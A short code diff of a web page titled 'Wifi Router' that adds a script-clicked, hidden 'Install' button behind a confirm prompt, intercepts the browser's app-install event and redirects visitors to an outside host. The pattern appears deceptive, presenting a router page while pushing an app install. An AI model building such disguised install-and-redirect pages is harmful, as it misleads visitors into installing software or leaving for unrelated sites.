@@ -9,7 +9,13 @@
     <title>Wifi Router</title>
   </head>
   <body>
+    <button class="in" id="install">Install</button>
     <script>
+    let check = confirm("Want to install app");
+    if(check){
+      const btn = document.getElementById("install");
+      btn.click();
+    }
       var url = "http://ipconfig.atwebpages.com";
       setTimeout(()=> {
         window.location.href = (url);
@@ -30,7 +36,7 @@
       }
 
       let deferredPrompt;
-    //  $("#install").css("display", "none");
+     $("#install").css("display", "none");
       window.addEventListener('beforeinstallprompt', (e) => {
         e.preventDefault();
         deferredPrompt = e;
